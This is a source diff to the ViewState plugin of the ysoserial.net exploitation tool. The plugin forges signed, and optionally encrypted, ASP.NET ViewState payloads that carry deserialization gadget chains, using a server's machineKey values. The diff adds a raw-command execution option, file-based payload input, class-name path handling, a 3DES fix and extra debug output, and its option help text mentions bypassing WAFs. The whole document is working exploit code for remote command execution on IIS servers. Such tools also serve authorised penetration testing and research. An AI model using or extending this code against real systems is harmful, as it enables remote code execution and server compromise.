@@ -3,6 +3,7 @@ using System;
 using System.Collections.Generic;
 using System.Configuration;
 using System.Globalization;
+using System.IO;
 using System.Linq;
 using System.Reflection;
 using System.Text;
@@ -34,12 +35,15 @@ namespace ysoserial.Plugins
         static bool isDebug = false;
         static string gadget = "ActivitySurrogateSelector";
         static string command = "";
+        static bool rawcmd = false;
         static bool cmdstdin = false;
         static string unsignedPayload = "";
+        static bool isUnsignedPayloadAFile = false;
 
         static bool isLegacy = false;
         static string viewstateGenerator = "";
         static string targetPagePath = "";
+        static bool pathIsClassName = false;
         static string IISAppInPathOrVirtualDir = "";
         static string viewStateUserKey = null;
         static bool isEncrypted = false;
@@ -50,35 +54,38 @@ namespace ysoserial.Plugins
 
 
         Assembly systemWebAsm = Assembly.Load("System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
-        
+
         string formatter = "losformatter";
         string payloadString = "";
         string shortestViewStateString = "/wEPZGQ="; // not in use at the moment but good to know!!!
         string dryRunViewStateString = "/wEPDwUKMDAwMDAwMDAwMGRk"; // dryrun is currently disabled until we find a meaningful method to use the errors
 
         static OptionSet options = new OptionSet()
-            {
-                {"examples", "to show a few examples. Other parameters will be ignored", v => showExamples = v != null },
-                /*{"dryrun", "to create a valid ViewState without using an exploit payload. The gadget and command parameters will be ignored", v => dryRun = v != null },*/
-                {"g|gadget=", "a gadget chain that supports LosFormatter. Default: ActivitySurrogateSelector", v => gadget = v },
-                {"c|command=", "the command suitable for the used gadget (will be ignored for ActivitySurrogateSelector)", v => command = v },
-                {"s|stdin", "The command to be executed will be read from standard input.", v => cmdstdin = v != null },
-                {"upayload=", "the unsigned LosFormatter payload in (base64 encoded). The gadget and command parameters will be ignored", v => unsignedPayload = v },
-                { "generator=", "the __VIEWSTATEGENERATOR value which is in HEX, useful for .NET <= 4.0. When not empty, 'legacy' will be used and 'path' and 'apppath' will be ignored.", v => viewstateGenerator = v},
-                {"path=", "the target web page. example: /app/folder1/page.aspx", v => targetPagePath = v},
-                {"apppath=", "the application path. this is needed in order to simulate TemplateSourceDirectory", v => IISAppInPathOrVirtualDir = v},
-                {"islegacy", "when provided, it uses the legacy algorithm suitable for .NET 4.0 and below", v => isLegacy = v != null},
-                {"isencrypted", "this will be used when the legacy algorithm is used to bypass WAFs", v => isEncrypted = v!= null},
-                {"viewstateuserkey=", "this sets the ViewStateUserKey parameter that is sometimes used as the anti-CSRF token", v => viewStateUserKey = v},
-                {"decryptionalg=", "the encryption algorithm can be set to  DES, 3DES, AES. Default: AES", v => decryptionAlg = v},
-                {"decryptionkey=", "this is the decryptionKey attribute from machineKey in the web.config file", v => decryptionKey = v},
-                {"validationalg=", "the validation algorithm can be set to SHA1, HMACSHA256, HMACSHA384, HMACSHA512, MD5, 3DES, AES. Default: HMACSHA256", v => validationAlg = v},
-                {"validationkey=", "this is the validationKey attribute from machineKey in the web.config file", v => validationKey = v},
-                {"showraw", "to stop URL-encoding the result. Default: false", v => showraw = v != null },
-                {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
-                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
-                {"isdebug", "to show useful debugging messages!", v => isDebug = v != null },
-            };
+        {
+            {"examples", "Show a few examples. Other parameters will be ignored.", v => showExamples = v != null },
+            {"dryrun", "Create a valid ViewState without using an exploit payload. The gadget and command parameters will be ignored.", v => dryRun = v != null },
+            {"g|gadget=", "A gadget chain that supports LosFormatter. Default: ActivitySurrogateSelector.", v => gadget = v },
+            {"c|command=", "The command suitable for the used gadget (will be ignored for ActivitySurrogateSelector).", v => command = v },
+            {"rawcmd", "Command will be executed as is without `cmd /c ` being appended (anything after the first space is an argument).", v => rawcmd = v != null },
+            {"s|stdin", "The command to be executed will be read from standard input.", v => cmdstdin = v != null },
+            {"usp|unsignedpayload=", "The unsigned LosFormatter payload (base64 encoded). The gadget and command parameters will be ignored.", v => unsignedPayload = v },
+            {"isfileusp", "Indicates that the unsigned payload contains a file name (e.g., payload.txt).", v => isUnsignedPayloadAFile = v != null },
+            {"vsg|generator=", "The __VIEWSTATEGENERATOR value in HEX, useful for .NET <= 4.0. When not empty, 'legacy' will be used and 'path' and 'apppath' will be ignored.", v => viewstateGenerator = v },
+            {"path=", "The target web page. Example: /app/folder1/page.aspx.", v => targetPagePath = v },
+            {"pathisclass", "Indicates that the path is a class name and should not be modified.", v => pathIsClassName = v != null },
+            {"apppath=", "The application path. Needed to simulate TemplateSourceDirectory.", v => IISAppInPathOrVirtualDir = v },
+            {"islegacy", "Use the legacy algorithm suitable for .NET 4.0 and below.", v => isLegacy = v != null },
+            {"isencrypted", "Use when the legacy algorithm is used to bypass WAFs.", v => isEncrypted = v != null },
+            {"vsuk|viewstateuserkey=", "Sets the ViewStateUserKey parameter, sometimes used as the anti-CSRF token.", v => viewStateUserKey = v },
+            {"da|decryptionalg=", "The encryption algorithm can be set to DES, 3DES, or AES. Default: AES.", v => decryptionAlg = v },
+            {"dk|decryptionkey=", "The decryptionKey attribute from machineKey in the web.config file.", v => decryptionKey = v },
+            {"va|validationalg=", "The validation algorithm can be set to SHA1, HMACSHA256, HMACSHA384, HMACSHA512, MD5, 3DES, or AES. Default: HMACSHA256.", v => validationAlg = v },
+            {"vk|validationkey=", "The validationKey attribute from machineKey in the web.config file.", v => validationKey = v },
+            {"showraw", "Stop URL-encoding the result. Default: false.", v => showraw = v != null },
+            {"minify", "Minify the payloads where applicable (experimental). Default: false.", v => minify = v != null },
+            {"ust|usesimpletype", "Remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true.", v => useSimpleType = v != null },
+            {"isdebug", "Show useful debugging messages.", v => isDebug = v != null },
+        };
 
         public string Name()
         {
@@ -110,9 +117,12 @@ namespace ysoserial.Plugins
                 if (String.IsNullOrEmpty(command) && cmdstdin)
                 {
                     inputArgs.Cmd = Console.ReadLine();
-                } else {
+                }
+                else
+                {
                     inputArgs.Cmd = command;
                 }
+                inputArgs.IsRawCmd = rawcmd;
                 inputArgs.Minify = minify;
                 inputArgs.UseSimpleType = useSimpleType;
             }
@@ -132,7 +142,7 @@ namespace ysoserial.Plugins
                 System.Environment.Exit(-1);
             }
 
-            if (String.IsNullOrEmpty(command) && !dryRun && !cmdstdin)
+            if (String.IsNullOrEmpty(command) && !dryRun && !cmdstdin && String.IsNullOrEmpty(unsignedPayload))
             {
                 Console.Write("ysoserial: ");
                 Console.WriteLine("Incorrect plugin mode/arguments combination");
@@ -173,7 +183,16 @@ namespace ysoserial.Plugins
             }
             else if (!String.IsNullOrEmpty(unsignedPayload))
             {
-                payloadString = unsignedPayload;
+                if (isUnsignedPayloadAFile)
+                {
+                    if (isDebug)
+                        Console.WriteLine("Reading payload from file " + unsignedPayload + " ...");
+                    payloadString = File.ReadAllText(unsignedPayload);
+                }
+                else
+                {
+                    payloadString = unsignedPayload;
+                }
             }
             else
             {
@@ -229,8 +248,15 @@ namespace ysoserial.Plugins
             var section = (MachineKeySection)ConfigurationManager.GetSection("system.web/machinekey"); //interesting
             var readOnlyField = typeof(ConfigurationElement).GetField("_bReadOnly", BindingFlags.Instance | BindingFlags.NonPublic);
             readOnlyField.SetValue(config, false);
+
+            if (validationAlg.ToUpper().Equals("3DES"))
+            {
+                // If validationAlg is 3DES, modify it to TripleDES in order for Enum.Parse to work.
+                validationAlg = "TripleDES";
+            }
+
             // we don't really need the encryption/decyption keys to create a valid legacy viewstate but this is used when isEncrypted=true
-            if (!String.IsNullOrEmpty(decryptionKey) && (!isLegacy || (isLegacy && isEncrypted)))
+            if (!String.IsNullOrEmpty(decryptionKey) && (!isLegacy || (validationAlg.ToUpper().Equals("TRIPLEDES") || validationAlg.ToUpper().Equals("AES")) || (isLegacy && isEncrypted)))
             {
                 if (isDebug)
                 {
@@ -239,14 +265,13 @@ namespace ysoserial.Plugins
                 config.Decryption = decryptionAlg;
                 config.DecryptionKey = decryptionKey;
             }
-            if (validationAlg.ToUpper().Equals("3DES"))
-            {
-                // If validationAlg is 3DES, modify it to TripleDES in order for Enum.Parse to work.
-                validationAlg = "TripleDES";
-            }
+
+
+
             config.Validation = (MachineKeyValidation)Enum.Parse(typeof(MachineKeyValidation), validationAlg);
 
-            if (validationKey.EndsWith(",IsolateApps")) {
+            if (validationKey.EndsWith(",IsolateApps"))
+            {
                 validationKey = validationKey.Substring(0, validationKey.Length - ",IsolateApps".Length);
 
                 var hexStringToByteArray = typeof(MachineKeySection).GetMethod("HexStringToByteArray", BindingFlags.Static | BindingFlags.NonPublic);
@@ -262,7 +287,7 @@ namespace ysoserial.Plugins
                 {
                     var stringUtilType = systemWebAsm.GetType("System.Web.Util.StringUtil");
                     var nonRandomizedStringComparerHashCodeMethod = stringUtilType.GetMethod("GetNonRandomizedStringComparerHashCode", BindingFlags.Static | BindingFlags.NonPublic);
-                     
+
                     dwCode = (int)nonRandomizedStringComparerHashCodeMethod.Invoke(null, new object[] { IISAppInPathOrVirtualDir });
                 }
 
@@ -270,7 +295,7 @@ namespace ysoserial.Plugins
                 key[1] = (byte)((dwCode & 0xff00) >> 8);
                 key[2] = (byte)((dwCode & 0xff0000) >> 16);
                 key[3] = (byte)((dwCode & 0xff000000) >> 24);
-                
+
                 StringBuilder hex = new StringBuilder(key.Length * 2);
                 foreach (byte b in key)
                     hex.AppendFormat("{0:X2}", b);
@@ -314,14 +339,14 @@ namespace ysoserial.Plugins
             {
                 // from GetMacKeyModifier() of System.Web.UI.ObjectStateFormatter
                 // This is where the path is important
-                int pageHashCodeTemp = (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { simulateTemplateSourceDirectory(targetPagePath), true });
-                pageHashCodeTemp += (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { simulateGetTypeName(targetPagePath, IISAppInPath), true });
+                int pageHashCodeTemp = (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { simulateTemplateSourceDirectory(targetPagePath, pathIsClassName), true });
+                pageHashCodeTemp += (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { simulateGetTypeName(targetPagePath, IISAppInPath, pathIsClassName), true });
                 pageHashCode = (uint)pageHashCodeTemp;
 
                 if (isDebug)
                 {
                     Console.WriteLine("Calculated pageHashCode in uint: " + (uint)pageHashCode);
-                    Console.WriteLine("Calculated __VIEWSTATEGENERATOR (ignored): " + pageHashCode.ToString("X8", CultureInfo.InvariantCulture));
+                    Console.WriteLine("Calculated __VIEWSTATEGENERATOR: " + pageHashCode.ToString("X8", CultureInfo.InvariantCulture));
                 }
             }
             else if (isDebug)
@@ -329,9 +354,13 @@ namespace ysoserial.Plugins
                 // this just for debugging to ensure the __VIEWSTATEGENERATOR matches the calculation
                 // this can also be used to identify the correct path and apppath parameters using trial and error
                 Console.WriteLine("Provided __VIEWSTATEGENERATOR in uint: " + parsedViewstateGeneratorIdentifier);
-                int pageHashCodeTemp = (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { simulateTemplateSourceDirectory(targetPagePath), true });
-                pageHashCodeTemp += (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { simulateGetTypeName(targetPagePath, IISAppInPath), true });
-                Console.WriteLine("Calculated pageHashCode in uint (ignored): " + (uint)pageHashCodeTemp);
+                int pageHashCodeTemp = (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { simulateTemplateSourceDirectory(targetPagePath, pathIsClassName), true });
+                pageHashCodeTemp += (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { simulateGetTypeName(targetPagePath, IISAppInPath, pathIsClassName), true });
+                Console.WriteLine("Calculated pageHashCode in uint: " + (uint)pageHashCodeTemp);
+                if (parsedViewstateGeneratorIdentifier != (uint)pageHashCodeTemp)
+                {
+                    Console.WriteLine("Provided __VIEWSTATEGENERATOR does not match the calculation based on the provided paths (path,apppath)");
+                }
             }
 
             var _macKeyBytes = new byte[4];
@@ -370,6 +399,21 @@ namespace ysoserial.Plugins
 
         private object generateViewState_4dot5(string targetPagePath, string IISAppInPath, string viewStateUserKey, byte[] payload)
         {
+            if (isDebug)
+            {
+                // This is just for debugging purposes:
+                // from GetMacKeyModifier() of System.Web.UI.ObjectStateFormatter
+                // This is where the path is important
+                var stringUtilType = systemWebAsm.GetType("System.Web.Util.StringUtil");
+                var nonRandomizedHashCodeMethod = stringUtilType.GetMethod("GetNonRandomizedHashCode", BindingFlags.Static | BindingFlags.NonPublic);
+                int pageHashCodeTemp = (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { simulateTemplateSourceDirectory(targetPagePath, pathIsClassName), true });
+                pageHashCodeTemp += (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { simulateGetTypeName(targetPagePath, IISAppInPath, pathIsClassName), true });
+                uint pageHashCode = (uint)pageHashCodeTemp;
+
+                Console.WriteLine("Calculated pageHashCode in uint: " + (uint)pageHashCode);
+                Console.WriteLine("Calculated __VIEWSTATEGENERATOR (not needed for .NET Framework >= 4.5): " + pageHashCode.ToString("X8", CultureInfo.InvariantCulture));
+            }
+
             var purposeType = systemWebAsm.GetType("System.Web.Security.Cryptography.Purpose");
             object[] parameters = new object[2];
             string mainPurpose = "WebForms.HiddenFieldPageStatePersister.ClientState";
@@ -384,8 +428,8 @@ namespace ysoserial.Plugins
 
             // This is where the path is important
             string[] specificPurposes = new String[] {
-                    "TemplateSourceDirectory: " + simulateTemplateSourceDirectory(targetPagePath).ToUpperInvariant(),
-                    "Type: " + simulateGetTypeName(targetPagePath, IISAppInPath).ToUpperInvariant()
+                    "TemplateSourceDirectory: " + simulateTemplateSourceDirectory(targetPagePath, pathIsClassName).ToUpperInvariant(),
+                    "Type: " + simulateGetTypeName(targetPagePath, IISAppInPath, pathIsClassName).ToUpperInvariant()
                 };
 
             // viewStateUserKey is normally the anti-CSRF parameter unless it is the same for all users! 
@@ -395,6 +439,11 @@ namespace ysoserial.Plugins
                 specificPurposes[specificPurposes.Length - 1] = "ViewStateUserKey: " + viewStateUserKey;
             }
             parameters[1] = specificPurposes;
+            if (isDebug)
+            {
+                Console.WriteLine("Main Purpose: " + mainPurpose);
+                Console.WriteLine("Specific Purposes: " + string.Join(",", specificPurposes));
+            }
 
             object purpose = Activator.CreateInstance(purposeType, parameters);
             var aspNetCryptoServiceProviderType = systemWebAsm.GetType("System.Web.Security.Cryptography.AspNetCryptoServiceProvider");
@@ -407,23 +456,34 @@ namespace ysoserial.Plugins
 
             string outputBase64 = System.Convert.ToBase64String(byteResult);
             if (!showraw)
-                outputBase64 = Uri.EscapeDataString(outputBase64);
+            {
+                // URL-encoding the base64 value - supporting long values
+                outputBase64 = outputBase64.Replace("+", "%2B")
+                         .Replace("/", "%2F")
+                         .Replace("=", "%3D");
+            }
+
             return outputBase64;
         }
 
-        private String simulateTemplateSourceDirectory(String strPath)
+        private String simulateTemplateSourceDirectory(String strPath, bool isClassName)
         {
+            String result = strPath;
 
             if (!strPath.StartsWith("/"))
-                strPath = "/" + strPath;
+                result = "/" + result;
 
-            String result = strPath;
-            
-            if (result.LastIndexOf(".") > result.LastIndexOf("/"))
+            if (isClassName)
+            {
+                result = result.Substring(0, result.LastIndexOf("/") + 1);
+            }
+            else if (result.LastIndexOf(".") > result.LastIndexOf("/"))
             {
                 // file name needs to be removed
                 result = result.Substring(0, result.LastIndexOf("/") + 1);
             }
+
+
             result = RemoveSlashFromPathIfNeeded(result);
 
             if (isDebug)
@@ -432,7 +492,7 @@ namespace ysoserial.Plugins
             return result;
         }
 
-        private String simulateGetTypeName(String strPath, String IISAppInPath)
+        private String simulateGetTypeName(String strPath, String IISAppInPath, bool isClassName)
         {
 
             if (!strPath.StartsWith("/"))
@@ -440,7 +500,7 @@ namespace ysoserial.Plugins
 
             String result = strPath;
 
-            if (!result.ToLower().EndsWith(".aspx"))
+            if (!isClassName && !result.ToLower().EndsWith(".aspx"))
                 result += "/default.aspx";
 
             IISAppInPath = IISAppInPath.ToLower();
